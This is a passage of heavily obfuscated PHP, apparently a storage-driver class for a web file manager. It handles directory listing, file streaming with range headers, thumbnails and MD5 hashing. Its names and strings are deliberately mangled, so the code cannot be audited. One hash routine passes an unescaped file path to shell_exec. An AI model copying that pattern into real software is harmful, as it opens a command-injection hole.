infoChildren($cÛ·ÔâµÕ, &$b——Í¿Ñí) { $D“†é´ù =& $_SERVER[í¤âËÚ£¶íÊ¢]; check_abort_echo(); $e†Ô“Óˆ„â = $this->listPath($cÛ·ÔâµÕ, !0); $e†Ô“Óˆ„â = array_merge($e†Ô“Óˆ„â[$D“†é´ù[84]], $e†Ô“Óˆ„â[$D“†é´ù[83]]); foreach ($e†Ô“Óˆ„â as $a×Ú’ç´êö) { if ($a×Ú’ç´êö[$D“†é´ù[29]] == $D“†é´ù[86]) { $b——Í¿Ñí[$D“†é´ù[89]]++; $e©’«êŸ‚æ = $this->getPathInner($a×Ú’ç´êö[$D“†é´ù[85]]); $this->infoChildren($e©’«êŸ‚æ, $b——Í¿Ñí); } else { $b——Í¿Ñí[$D“†é´ù[88]]++; $b——Í¿Ñí[$D“†é´ù[87]] += $a×Ú’ç´êö[$D“†é´ù[87]]; } } } public function fileSubstr($fÃ‚×ñ‡¹Ä, $aÔŸ®õ˜‡», $bñ»½Ç£ò) { } public function listAll($E‰÷É¬Âƒ) { } public function listAllMake($b‚×¿îëŒ, &$E—èïÖ˜Ø) { $eòá¹Å§® =& $_SERVER[í¤âËÚ£¶íÊ¢]; check_abort_echo(); $B°ˆ„¼† = $this->listPath($b‚×¿îëŒ, !0); if (!$B°ˆ„¼†) { return; } $a‘°Ù´øŒ† = array_merge($B°ˆ„¼†[$eòá¹Å§®[84]], $B°ˆ„¼†[$eòá¹Å§®[83]]); foreach ($a‘°Ù´øŒ† as $B£Ó§Ñ«„) { goto B²¥°ğ¼êò; Bø®Î½·”ä: if (isset($B£Ó§Ñ«„[$eòá¹Å§®[93]])) { $D¬…Â”•[$eòá¹Å§®[93]] = $B£Ó§Ñ«„[$eòá¹Å§®[93]]; } if (!$a®±à›ÉĞë) { $E—èïÖ˜Ø[] = $D¬…Â”•; continue; } $E—èïÖ˜Ø[] = $D¬…Â”•; goto C‰¯¾ÇÚî; C‰¯¾ÇÚî: $this->listAllMake($B£Ó§Ñ«„[$eòá¹Å§®[85]], $E—èïÖ˜Ø); goto B„–ùÉ­Œ‹; B²¥°ğ¼êò: $a®±à›ÉĞë = $B£Ó§Ñ«„[$eòá¹Å§®[29]] == $eòá¹Å§®[86]; $D¬…Â”• = array($eòá¹Å§®[85] => $B£Ó§Ñ«„[$eòá¹Å§®[85]], $eòá¹Å§®[86] => $a®±à›ÉĞë); if (isset($B£Ó§Ñ«„[$eòá¹Å§®[87]])) { $D¬…Â”•[$eòá¹Å§®[87]] = $B£Ó§Ñ«„[$eòá¹Å§®[87]]; } goto Bø®Î½·”ä; B„–ùÉ­Œ‹: } } public function listAllSimple($DÉ›¨½Ñ‡Á) { $aè‚³«…Ô­ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C³Ú­ˆÓÀÍ = array(); $cÔ—õºÉìª = $this->listAll($DÉ›¨½Ñ‡Á); $FÌÖŸÚœ«¡ = $this->getPathOuter($DÉ›¨½Ñ‡Á); foreach ($cÔ—õºÉìª as $c¨ˆñ×ÓŠË) { goto dçÌ²õµœ; fŞË¸øĞÅß: if (!$c¨ˆñ×ÓŠË[$aè‚³«…Ô­[86]]) { $Bíİˆ„Éø÷[$aè‚³«…Ô­[95]] = $E¢…í…ˆÅğ; } $C³Ú­ˆÓÀÍ[] = $Bíİˆ„Éø÷; goto DÃÛ¢Áº’ñ; CÁ¼¨‡Ì“‰: $Bíİˆ„Éø÷ = array($aè‚³«…Ô­[85] => $FÍØÃµéôİ, $aè‚³«…Ô­[86] => $c¨ˆñ×ÓŠË[$aè‚³«…Ô­[86]]); if (isset($c¨ˆñ×ÓŠË[$aè‚³«…Ô­[87]]) && !$c¨ˆñ×ÓŠË[$aè‚³«…Ô­[86]]) { $Bíİˆ„Éø÷[$aè‚³«…Ô­[87]] = $c¨ˆñ×ÓŠË[$aè‚³«…Ô­[87]]; } if (isset($c¨ˆñ×ÓŠË[$aè‚³«…Ô­[93]])) { $Bíİˆ„Éø÷[$aè‚³«…Ô­[93]] = $c¨ˆñ×ÓŠË[$aè‚³«…Ô­[93]]; } goto fŞË¸øĞÅß; dçÌ²õµœ: $E¢…í…ˆÅğ = $c¨ˆñ×ÓŠË[$aè‚³«…Ô­[85]]; $FÍØÃµéôİ = $c¨ˆñ×ÓŠË[$aè‚³«…Ô­[85]]; if (isset($c¨ˆñ×ÓŠË[$aè‚³«…Ô­[94]])) { $E¢…í…ˆÅğ = $c¨ˆñ×ÓŠË[$aè‚³«…Ô­[94]][$aè‚³«…Ô­[85]]; $c¨ˆñ×ÓŠË[$aè‚³«…Ô­[87]] = $c¨ˆñ×ÓŠË[$aè‚³«…Ô­[94]][$aè‚³«…Ô­[87]]; $c¨ˆñ×ÓŠË[$aè‚³«…Ô­[93]] = $c¨ˆñ×ÓŠË[$aè‚³«…Ô­[94]][$aè‚³«…Ô­[93]]; } else { $FÍØÃµéôİ = substr($c¨ˆñ×ÓŠË[$aè‚³«…Ô­[85]], strlen(get_path_father($FÌÖŸÚœ«¡))); $FÍØÃµéôİ = $aè‚³«…Ô­[8] . ltrim($FÍØÃµéôİ, $aè‚³«…Ô­[8]); } goto CÁ¼¨‡Ì“‰; DÃÛ¢Áº’ñ: } return $C³Ú­ˆÓÀÍ; } public function upload($Eœï¿Åòµ°, $FëÌ²ƒ½¤, $eˆ Îõ = false, $dƒé ‡î©‚ = REPEAT_REPLACE) { } public function uploadFileByID($AĞš»¢«ñ , $Eèßš¿‹”, $dğ†…ç„ï) { } public function uploadFileByPath($aé¤¤ùÌÉÙ, $bÔíÕ˜°ìÏ, $eãêÊõÕØ = array()) { } public function isUploadServer() { $b´ƒ–·¶ËÅ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $b´ƒ–·¶ËÅ[96]) { return !0; } return $GLOBALS[$b´ƒ–·¶ËÅ[6]][$b´ƒ–·¶ËÅ[97]][$b´ƒ–·¶ËÅ[98]]; } public function isFileOutServer() { $CñÂ¢ŠŠìİ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $CñÂ¢ŠŠìİ[96]) { return !0; } return $GLOBALS[$CñÂ¢ŠŠìİ[6]][$CñÂ¢ŠŠìİ[97]][$CñÂ¢ŠŠìİ[99]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($e²°‚—ÎÒŸ) { $b±³«àó =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->isCdnHost()) { return $e²°‚—ÎÒŸ; } return str_replace(trim(get_url_root($e²°‚—ÎÒŸ), $b±³«àó[8]), trim($this->cdnHost, $b±³«àó[8]), $e²°‚—ÎÒŸ); } public function uploadLink($C¶çŸßä Á, $A¥İ¢¯©ìè = 0) { goto f¶åºì»¶²; eŒê‰”‰ç­: $c½Íôß¦ã = $A¥İ¢¯©ìè <= $a·ó†à²çî ? $Cİ‹¸—ì¯¸[100] : $Cİ‹¸—ì¯¸[101]; $e¼«ôÚ÷ç = (!$A¥İ¢¯©ìè ? 1 : ceil($A¥İ¢¯©ìè / pow(1024, 3))) * 3600 * 4; $a‡·Ê‰‚çô = $this->{$c½Íôß¦ã}($C¶çŸßä Á, $e¼«ôÚ÷ç); goto FñŠØÄ…‰‰; cò•øãº¢: if (!in_array($bÔÌ‚“¤¿í, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $a·ó†à²çî = 1024 * 1024 * 10; goto eŒê‰”‰ç­; f¶åºì»¶²: $Cİ‹¸—ì¯¸ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($this->isUploadServer()) { return; } $bÔÌ‚“¤¿í = $this->getType(); goto cò•øãº¢; FñŠØÄ…‰‰: if ($a‡·Ê‰‚çô) { $a‡·Ê‰‚çô[$Cİ‹¸—ì¯¸[102]] = $C¶çŸßä Á; $a‡·Ê‰‚çô[$Cİ‹¸—ì¯¸[103]] = $bÔÌ‚“¤¿í; } return $a‡·Ê‰‚çô; goto D¨ÆÕ¹¯”‹; D¨ÆÕ¹¯”‹: } public function uploadFormData($dÍ‰ïÌ¹–, $D‹ÑóŒ¨èğ = 3600) { } public function multiUploadFormData($DÓ‚¡îïóÕ, $eõØ¾èÑ§ = 3600) { } public function download($bÓÕÆ…¦Ô, $b£Å†ŠÃ‰) { } public function ext($cÜ‹§“÷æ‹) { $FíŒ©ë†®Ì =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (strpos($cÜ‹§“÷æ‹, $FíŒ©ë†®Ì[8]) === -1) { $C´¹ïÃŒ‘ = $cÜ‹§“÷æ‹; } else { $C´¹ïÃŒ‘ = $this->pathThis($cÜ‹§“÷æ‹); } $dÃŸ×öÆÒ = $FíŒ©ë†®Ì[33]; if (strstr($C´¹ïÃŒ‘, $FíŒ©ë†®Ì[104])) { $dÃŸ×öÆÒ = substr($C´¹ïÃŒ‘, strrpos($C´¹ïÃŒ‘, $FíŒ©ë†®Ì[104]) + 1); $dÃŸ×öÆÒ = strtolower($dÃŸ×öÆÒ); } if (strlen($dÃŸ×öÆÒ) > 3 && preg_match($FíŒ©ë†®Ì[105], $dÃŸ×öÆÒ, $a“Ï¾¢¸‚)) { $dÃŸ×öÆÒ = $FíŒ©ë†®Ì[33]; } return $dÃŸ×öÆÒ; } public function pathThis($DŒß‘óà•”) { $aéÅÆĞ¬À =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DŒß‘óà•” = str_replace($aéÅÆĞ¬À[106], $aéÅÆĞ¬À[8], rtrim($DŒß‘óà•”, $aéÅÆĞ¬À[8])); $B¼ìµ³™¨ì = strrpos($DŒß‘óà•”, $aéÅÆĞ¬À[8]); if ($B¼ìµ³™¨ì === !1) { return $DŒß‘óà•”; } return substr($DŒß‘óà•”, $B¼ìµ³™¨ì + 1); } public function pathFather($Cİ—òò×ñ´) { $B‘Ôï¨Ó˜™ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Cİ—òò×ñ´ = str_replace($B‘Ôï¨Ó˜™[106], $B‘Ôï¨Ó˜™[8], rtrim($Cİ—òò×ñ´, $B‘Ôï¨Ó˜™[8])); $cŠ²È“áßÌ = strrpos($Cİ—òò×ñ´, $B‘Ôï¨Ó˜™[8]); if ($cŠ²È“áßÌ === !1) { return $B‘Ôï¨Ó˜™[33]; } return substr($Cİ—òò×ñ´, 0, $cŠ²È“áßÌ + 1); } public function hashSimple($dÓ‰ŠÎÔ) { goto DÕŠ¨¬Æ…«; b®èÍÖ×‘â: $f…²•Ââ‘á = 200; $F ‡Œµ­Õì = 50; if ($bºã ÅÎ¹É <= $f…²•Ââ‘á * $F ‡Œµ­Õì) { return $this->hashMd5($dÓ‰ŠÎÔ) . $bºã ÅÎ¹É; } goto dˆ¾ğ³ğì; fù˜ƒ‰àœ…: $DÖ¼Á«Øè .= $this->fileSubstr($dÓ‰ŠÎÔ, $bºã ÅÎ¹É - $f…²•Ââ‘á, $f…²•Ââ‘á); return md5($DÖ¼Á«Øè) . $bºã ÅÎ¹É; goto A¥Ş˜¹ÁŠ; DÕŠ¨¬Æ…«: $CÀéÀ±À« =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$dÓ‰ŠÎÔ) { return md5($CÀéÀ±À«[33]); } $bºã ÅÎ¹É = $this->size($dÓ‰ŠÎÔ); goto b®èÍÖ×‘â; dˆ¾ğ³ğì: $a¹Ü“‘çŒ‹ = intval($bºã ÅÎ¹É / $F ‡Œµ­Õì); $DÖ¼Á«Øè = $CÀéÀ±À«[33]; for ($d¤‘§ãëƒƒ = 0; $d¤‘§ãëƒƒ < $F ‡Œµ­Õì; $d¤‘§ãëƒƒ++) { $DÖ¼Á«Øè .= $this->fileSubstr($dÓ‰ŠÎÔ, $a¹Ü“‘çŒ‹ * $d¤‘§ãëƒƒ, $f…²•Ââ‘á); } goto fù˜ƒ‰àœ…; A¥Ş˜¹ÁŠ: } public static $md5Cache = array(); public function hashMd5($A¨æ×„·ñõ) { $A¨æ×„·ñõ = $this->iconvSystem($A¨æ×„·ñõ); if (isset(self::$md5Cache[$A¨æ×„·ñõ])) { return self::$md5Cache[$A¨æ×„·ñõ]; } self::$md5Cache[$A¨æ×„·ñõ] = $this->hashMd5Shell($A¨æ×„·ñõ); if (!self::$md5Cache[$A¨æ×„·ñõ]) { self::$md5Cache[$A¨æ×„·ñõ] = @md5_file($A¨æ×„·ñõ); } return self::$md5Cache[$A¨æ×„·ñõ]; } private function hashMd5Shell($fÂ‘©ˆÜù) { goto A¼í…­’ß…; FÚÁì¾ö¹: $d‡¥ÔÜ¶Í = shell_exec($FÉÁ¥µçÛ . "\40\x22{$fÂ‘©ˆÜù}\x22"); $d‡¥ÔÜ¶Í = str_replace($E”«éã¬ÀÔ[113], $E”«éã¬ÀÔ[33], $d‡¥ÔÜ¶Í); return substr($d‡¥ÔÜ¶Í, 0, 32); goto e—ÔÖö²’ ; A¼í…­’ß…: $E”«éã¬ÀÔ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!function_exists($E”«éã¬ÀÔ[107])) { return !1; } $C·…†¬ò = array($E”«éã¬ÀÔ[108], $E”«éã¬ÀÔ[109]); goto F‡íÜÇÔóé; F‡íÜÇÔóé: $FÉÁ¥µçÛ = Cache::get($E”«éã¬ÀÔ[110]); if (!$FÉÁ¥µçÛ) { $EØï²—‰É = BASIC_PATH . $E”«éã¬ÀÔ[111]; $eÉñõÑ±éš = md5_file($EØï²—‰É); $FÉÁ¥µçÛ = $E”«éã¬ÀÔ[112]; foreach ($C·…†¬ò as $cê‡æäâÆ„) { $d‡¥ÔÜ¶Í = shell_exec($cê‡æäâÆ„ . "\40\42{$EØï²—‰É}\42"); if ($d‡¥ÔÜ¶Í && substr(trim($d‡¥ÔÜ¶Í), 0, 32) == $eÉñõÑ±éš) { $FÉÁ¥µçÛ = $cê‡æäâÆ„; break; } } Cache::set($E”«éã¬ÀÔ[110], $FÉÁ¥µçÛ, 3600); } if ($FÉÁ¥µçÛ == $E”«éã¬ÀÔ[112]) { return !1; } goto FÚÁì¾ö¹; e—ÔÖö²’ : } public function link($E½ù§…÷Æ˜) { return $E½ù§…÷Æ˜; } public function fileOut($D³ê°Œ¸éà, $DñšÜµèá = false, $C°­‰‚ÔŸæ = false, $a…âóŞ²µ = '') { goto Aí”ª¤¥¹; b·Ÿß—×: if ($_SERVER[$aˆ‰¦ˆƒå‚[166]] == $aˆ‰¦ˆƒå‚[167]) { return; } $déˆºÑìÍé = 1024 * 100; $CÃ÷À©—¡õ = 0; goto BéŸËÕ­µ; EãñÃÅòÌø: $BÒ¬àçÙİ = !0; if ($_SERVER[$aˆ‰¦ˆƒå‚[163]] == $aˆ‰¦ˆƒå‚[164] && $eï®å‹–öå > 1204 * 1024 * 1024 * 2) { $BÒ¬àçÙİ = !1; } if ($BÒ¬àçÙİ) { header($aˆ‰¦ˆƒå‚[165] . ($dŠ¹ãé½»Ö - $CË µœÂ + 1)); } goto b·Ÿß—×; dô‚ÉË ²§: $bØÅ¶çùƒÉ = get_file_mime($EÕä˜Åï‹); if (strstr($bØÅ¶çùƒÉ, $aˆ‰¦ˆƒå‚[126])) { $bØÅ¶çùƒÉ = $bØÅ¶çùƒÉ . $aˆ‰¦ˆƒå‚[127]; } if ($DñšÜµèá === !1 && !mime_support($bØÅ¶çùƒÉ)) { $DñšÜµèá = !0; $bØÅ¶çùƒÉ = $aˆ‰¦ˆƒå‚[128]; } goto B÷¸ÉËƒ²; F­ˆÛñ‡°ï: header($aˆ‰¦ˆƒå‚[147] . $eï®å‹–öå); header($aˆ‰¦ˆƒå‚[148]); if (!$DñšÜµèá && $EÕä˜Åï‹ == $aˆ‰¦ˆƒå‚[149]) { if ($eï®å‹–öå > 1024 * 1024 * 5) { die; } $E¡Â‚Ùºƒ = $this->getContent($D³ê°Œ¸éà); $E¡Â‚Ùºƒ = Html::clearSVG($E¡Â‚Ùºƒ); header($aˆ‰¦ˆƒå‚[150] . strlen($E¡Â‚Ùºƒ)); echo $E¡Â‚Ùºƒ; die; } goto C‰Í×Ñ…Ì™; aÊ‚‰á¢‰Ç: $F½Ùğİ¿à = $aˆ‰¦ˆƒå‚[125] . $F½Ùğİ¿à . $aˆ‰¦ˆƒå‚[131] . $F½Ùğİ¿à; if ($DñšÜµèá) { header($aˆ‰¦ˆƒå‚[132]); header($aˆ‰¦ˆƒå‚[133] . $F½Ùğİ¿à); } else { header($aˆ‰¦ˆƒå‚[134] . $F½Ùğİ¿à); } header($aˆ‰¦ˆƒå‚[135] . gmdate($aˆ‰¦ˆƒå‚[119], time() + 3600 * 24 * 30) . $aˆ‰¦ˆƒå‚[136]); goto Aœ³İÊ‡”Ó; D‘¹¹Ó‘Ò£: @ob_end_clean(); set_timeout(); $bë­¤ÌÀ = $this->infoFull($D³ê°Œ¸éà); goto AŠ·Ó½÷ÌÕ; fÄ®´ ŠØ¹: if (isset($_SERVER[$aˆ‰¦ˆƒå‚[140]]) && strtotime($_SERVER[$aˆ‰¦ˆƒå‚[140]]) == $bë­¤ÌÀ[$aˆ‰¦ˆƒå‚[93]]) { header($aˆ‰¦ˆƒå‚[141], !0, 304); die; } if (isset($_SERVER[$aˆ‰¦ˆƒå‚[142]]) && $_SERVER[$aˆ‰¦ˆƒå‚[142]] == $a…âóŞ²µ) { header($aˆ‰¦ˆƒå‚[143] . $a…âóŞ²µ, !0, 304); die; } header($aˆ‰¦ˆƒå‚[143] . $a…âóŞ²µ); goto E„ ‚Éò™‰; C‰Í×Ñ…Ì™: $fÉ³„©—ƒé = strtolower($_SERVER[$aˆ‰¦ˆƒå‚[151]]); if ($bá‚³Û®« && $fÉ³„©—ƒé && $b¬¹ÖïÌ§İ) { if (strstr($fÉ³„©—ƒé, $aˆ‰¦ˆƒå‚[152])) { header($aˆ‰¦ˆƒå‚[153] . $D³ê°Œ¸éà); } else { if (strstr($fÉ³„©—ƒé, $aˆ‰¦ˆƒå‚[154])) { header($aˆ‰¦ˆƒå‚[155] . $D³ê°Œ¸éà); } else { if (strstr($fÉ³„©—ƒé, $aˆ‰¦ˆƒå‚[156])) { header($aˆ‰¦ˆƒå‚[157] . $D³ê°Œ¸éà); } } } if ($d ±Á’½ìº) { header($aˆ‰¦ˆƒå‚[158] . $d ±Á’½ìº); } return; } if (isset($_SERVER[$aˆ‰¦ˆƒå‚[159]])) { if (preg_match($aˆ‰¦ˆƒå‚[160], $_SERVER[$aˆ‰¦ˆƒå‚[159]], $Bë…‰‰¿è)) { $CË µœÂ = intval($Bë…‰‰¿è[1]); if (!empty($Bë…‰‰¿è[2])) { $dŠ¹ãé½»Ö = intval($Bë…‰‰¿è[2]); } } header($aˆ‰¦ˆƒå‚[161]); header("\x43\157\156\x74\145\x6e\164\55\x52\x61\x6e\147\145\x3a\x20\142\171\164\x65\x73\x20{$CË µœÂ}\x2d{$dŠ¹ãé½»Ö}\57" . $eï®å‹–öå); } else { header($aˆ‰¦ˆƒå‚[162]); } goto EãñÃÅòÌø; Aœ³İÊ‡”Ó: header($aˆ‰¦ˆƒå‚[137]); header($aˆ‰¦ˆƒå‚[138]); header($aˆ‰¦ˆƒå‚[139]); goto fÄ®´ ŠØ¹; Aí”ª¤¥¹: $aˆ‰¦ˆƒå‚ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->cacheMethod(null, null); if (!$D³ê°Œ¸éà || !$this->exist($D³ê°Œ¸éà)) { show_json(LNG($aˆ‰¦ˆƒå‚[114]), !1, $C°­‰‚ÔŸæ); } goto e’íÄõË¿; E ´Í‘Èª: if (in_array($EÕä˜Åï‹, array($aˆ‰¦ˆƒå‚[120], $aˆ‰¦ˆƒå‚[121], $aˆ‰¦ˆƒå‚[122], $aˆ‰¦ˆƒå‚[123]))) { $EÕä˜Åï‹ = $aˆ‰¦ˆƒå‚[124]; } if (!$a…âóŞ²µ) { $a…âóŞ²µ = md5($F›Ûø“ßåñ . $this->hashSimple($D³ê°Œ¸éà)); } $a…âóŞ²µ = $aˆ‰¦ˆƒå‚[125] . $a…âóŞ²µ . $aˆ‰¦ˆƒå‚[125]; goto dô‚ÉË ²§; BéŸËÕ­µ: if ($d ±Á’½ìº) { $CÃ÷À©—¡õ = intval(1000 * 1000 * ($déˆºÑìÍé / $d ±Á’½ìº)); } while ($CË µœÂ <= $dŠ¹ãé½»Ö) { $a¼…œéœ› = timeFloat(); check_abort(); $C¹´çâÙ¤Ô = $dŠ¹ãé½»Ö - $CË µœÂ + 1; if ($C¹´çâÙ¤Ô <= $déˆºÑìÍé) { $déˆºÑìÍé = $C¹´çâÙ¤Ô; } echo $this->fileSubstr($D³ê°Œ¸éà, $CË µœÂ, $déˆºÑìÍé); $CË µœÂ += $déˆºÑìÍé; if ($déˆºÑìÍé == $C¹´çâÙ¤Ô) { $CË µœÂ = $dŠ¹ãé½»Ö + 1; } if ($CÃ÷À©—¡õ) { $dË³‘ÁêÏˆ = intval(1000 * 1000 * (timeFloat() - $a¼…œéœ›)); $bÛ‘Â§Ü¶ = $CÃ÷À©—¡õ - $dË³‘ÁêÏˆ; if ($bÛ‘Â§Ü¶ > 5) { usleep($bÛ‘Â§Ü¶); } } } goto e¯»¥ÕøèÈ; d£‰ÙÓâ„Î: $CË µœÂ = 0; $dŠ¹ãé½»Ö = $eï®å‹–öå - 1; $EÕä˜Åï‹ = $this->ext($DÔø—©ÓŞ); goto E ´Í‘Èª; B÷¸ÉËƒ²: header($aˆ‰¦ˆƒå‚[129]); header($aˆ‰¦ˆƒå‚[130] . $bØÅ¶çùƒÉ); $F½Ùğİ¿à = rawurlencode($DÔø—©ÓŞ); goto aÊ‚‰á¢‰Ç; e’íÄõË¿: $bá‚³Û®« = $this->getType() == $aˆ‰¦ˆƒå‚[115]; $b¬¹ÖïÌ§İ = $GLOBALS[$aˆ‰¦ˆƒå‚[6]][$aˆ‰¦ˆƒå‚[97]][$aˆ‰¦ˆƒå‚[116]][$aˆ‰¦ˆƒå‚[117]]; $d ±Á’½ìº = (double) $GLOBALS[$aˆ‰¦ˆƒå‚[6]][$aˆ‰¦ˆƒå‚[97]][$aˆ‰¦ˆƒå‚[116]][$aˆ‰¦ˆƒå‚[118]] * 1024 * 1024; goto D‘¹¹Ó‘Ò£; AŠ·Ó½÷ÌÕ: $eï®å‹–öå = $bë­¤ÌÀ[$aˆ‰¦ˆƒå‚[87]]; $F›Ûø“ßåñ = gmdate($aˆ‰¦ˆƒå‚[119], $bë­¤ÌÀ[$aˆ‰¦ˆƒå‚[93]]); $DÔø—©ÓŞ = $C°­‰‚ÔŸæ ? $C°­‰‚ÔŸæ : $this->iconvApp($bë­¤ÌÀ[$aˆ‰¦ˆƒå‚[28]]); goto d£‰ÙÓâ„Î; E„ ‚Éò™‰: header($aˆ‰¦ˆƒå‚[144] . $F›Ûø“ßåñ . $aˆ‰¦ˆƒå‚[136]); header($aˆ‰¦ˆƒå‚[145] . $DÔø—©ÓŞ); header($aˆ‰¦ˆƒå‚[146]); goto F­ˆÛñ‡°ï; e¯»¥ÕøèÈ: } public function fileOutServer($a½ãèáŠæ, $C™å›³‡âá = false, $CÙšº‹ËŸ‡ = false, $Eà¢õ½ïËà = '') { $this->fileOut($a½ãèáŠæ, $C™å›³‡âá, $CÙšº‹ËŸ‡, $Eà¢õ½ïËà); } public function fileOutLink($f¶Ş¤íŞ) { header($_SERVER[í¤âËÚ£¶íÊ¢][168] . $f¶Ş¤íŞ); die; } public function cacheMethod($Bƒ²ƒÜëÂì, $DçõÛ¯º‹í, $DœßÑÁäî´ = null) { goto A®ˆÅ‡¼·; A®ˆÅ‡¼·: $c†¦èëŸ® =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $aˆÓ¾£†• = array(); $b³’™¤ƒ¼á = $DçõÛ¯º‹í ? ltrim($this->getPathOuter($DçõÛ¯º‹í), $c†¦èëŸ®[8]) : $DçõÛ¯º‹í; goto Fà”¸©ÏŞÇ; cÛÎ¿¦çˆ¨: if (!is_null($DœßÑÁäî´)) { $aˆÓ¾£†•[$Eæò—ƒª] = $DœßÑÁäî´; return; } $d¯Ôî„ÓÛ = isset($aˆÓ¾£†•[$Eæò—ƒª]) ? $aˆÓ¾£†•[$Eæò—ƒª] : null; if (!is_null($d¯Ôî„ÓÛ)) { return $d¯Ôî„ÓÛ; } goto f™©­„‹İÁ; Fà”¸©ÏŞÇ: $Eæò—ƒª = $c†¦èëŸ®[169] . $Bƒ²ƒÜëÂì . $c†¦èëŸ®[170] . rtrim($b³’™¤ƒ¼á, $c†¦èëŸ®[8]); if (is_null($Bƒ²ƒÜëÂì)) { $aˆÓ¾£†• = array(); return; } if (is_null($DçõÛ¯º‹í)) { unset($aˆÓ¾£†•[$Eæò—ƒª]); return; } goto cÛÎ¿¦çˆ¨; f™©­„‹İÁ: $d¯Ôî„ÓÛ = $this->{$Bƒ²ƒÜëÂì}($DçõÛ¯º‹í); $aˆÓ¾£†•[$Eæò—ƒª] = $d¯Ôî„ÓÛ; return $d¯Ôî„ÓÛ; goto B”Ê÷Û“Ø‰; B”Ê÷Û“Ø‰: } public function fileOutImage($c†¦Ï¯™Ã, $b™ ·ÄÔÛ = 250) { goto EÁÓËËàôª; EÁÓËËàôª: $A”òä„†–Û =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (substr($c†¦Ï¯™Ã, 0, 4) == $A”òä„†–Û[156]) { $this->fileOutLink($c†¦Ï¯™Ã); } $F’â²…¢ÎÈ = $this->info($c†¦Ï¯™Ã); goto D‘¯©‘Î¹; dËŒ²ÏóÉÅ: if (!file_exists($Fä£è‰¦å) || filesize($Fä£è‰¦å) < 100) { return @file_exists($aÓ×éçÉó®) ? IO::fileOut($aÓ×éçÉó®) : $this->fileOut($c†¦Ï¯™Ã); } if (!($aÙ’™ßÓ¿Î = IO::move($Fä£è‰¦å, $D‘ãæÙóöö))) { return IO::fileOut($Fä£è‰¦å); } del_file($Fä£è‰¦å); goto e¬øøå©ìÈ; D‘¯©‘Î¹: $CÑÙ–ç‚è = $F’â²…¢ÎÈ[$A”òä„†–Û[28]]; $CÙÕõ§õ±µ = !1; if (isset($GLOBALS[$A”òä„†–Û[171]]) && $GLOBALS[$A”òä„†–Û[171]][$A”òä„†–Û[85]] == $F’â²…¢ÎÈ[$A”òä„†–Û[85]]) { $bƒ¢¼±¢‚è = $GLOBALS[$A”òä„†–Û[171]][$A”òä„†–Û[172]]; if (!$F’â²…¢ÎÈ[$A”òä„†–Û[173]]) { $F’â²…¢ÎÈ[$A”òä„†–Û[173]] = $GLOBALS[$A”òä„†–Û[171]]; } if (isset($bƒ¢¼±¢‚è[$A”òä„†–Û[174]])) { if ($bƒ¢¼±¢‚è[$A”òä„†–Û[174]] <= $b™ ·ÄÔÛ && $bƒ¢¼±¢‚è[$A”òä„†–Û[175]] <= $b™ ·ÄÔÛ) { $CÙÕõ§õ±µ = !0; } } $CÑÙ–ç‚è = $F’â²…¢ÎÈ[$A”òä„†–Û[173]][$A”òä„†–Û[28]]; } goto BÂÜŒëç¤; B¯«¸¥÷ç•: $Fä£è‰¦å = DATA_THUMB . $c¤—‘±ÌŒ‹; del_file($Fä£è‰¦å); if (!@file_exists($Fä£è‰¦å)) { $BïÒó¦Úî = TEMP_FILES; if (!is_dir($BïÒó¦Úî)) { mk_dir($BïÒó¦Úî); } $aÓ×éçÉó® = $BïÒó¦Úî . $f‡‚ÁùÅÂÅ . $A”òä„†–Û[104] . $F’â²…¢ÎÈ[$A”òä„†–Û[177]]; if (!@file_exists($aÓ×éçÉó®)) { $aÓ×éçÉó® = $this->download($c†¦Ï¯™Ã, $aÓ×éçÉó®); } ImageThumb::createThumb($aÓ×éçÉó®, $Fä£è‰¦å, $b™ ·ÄÔÛ, $b™ ·ÄÔÛ * 10); } goto dËŒ²ÏóÉÅ; e¬øøå©ìÈ: IO::fileOut($aÙ’™ßÓ¿Î); goto cì°ÔÌîœ‹; BÂÜŒëç¤: if ($F’â²…¢ÎÈ[$A”òä„†–Û[87]] <= 1024 * 50 || $CÙÕõ§õ±µ || !function_exists($A”òä„†–Û[176]) || $F’â²…¢ÎÈ[$A”òä„†–Û[177]] == $A”òä„†–Û[178]) { return $this->fileOut($c†¦Ï¯™Ã, !1, $CÑÙ–ç‚è); } if (isset($F’â²…¢ÎÈ[$A”òä„†–Û[173]][$A”òä„†–Û[179]])) { $f‡‚ÁùÅÂÅ = $F’â²…¢ÎÈ[$A”òä„†–Û[173]][$A”òä„†–Û[179]]; } else { if (isset($F’â²…¢ÎÈ[$A”òä„†–Û[173]][$A”òä„†–Û[180]])) { $f‡‚ÁùÅÂÅ = $F’â²…¢ÎÈ[$A”òä„†–Û[173]][$A”òä„†–Û[180]]; } else { $f‡‚ÁùÅÂÅ = md5("{$F’â²…¢ÎÈ[$A”òä„†–Û[28]]}\137{$F’â²…¢ÎÈ[$A”òä„†–Û[85]]}\x5f{$F’â²…¢ÎÈ[$A”òä„†–Û[87]]}"); } } $c¤—‘±ÌŒ‹ = "{$f‡‚ÁùÅÂÅ}\x5f{$b™ ·ÄÔÛ}\56\160\156\x67"; goto F²Ø×‹Ë“š; F²Ø×‹Ë“š: if (!($AØá­ÂùòÚ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $A”òä„†–Û[181]))) { $D‘ãæÙóöö = IO::mkdir(IO_PATH_SYSTEM_TEMP . $A”òä„†–Û[182]); } else { $D‘ãæÙóöö = KodIO::make($AØá­ÂùòÚ); } if ($AØá­ÂùòÚ = IO::fileNameExist($D‘ãæÙóöö, $c¤—‘±ÌŒ‹)) { $Fä£è‰¦å = KodIO::make($AØá­ÂùòÚ); return IO::fileOut($Fä£è‰¦å, !1, 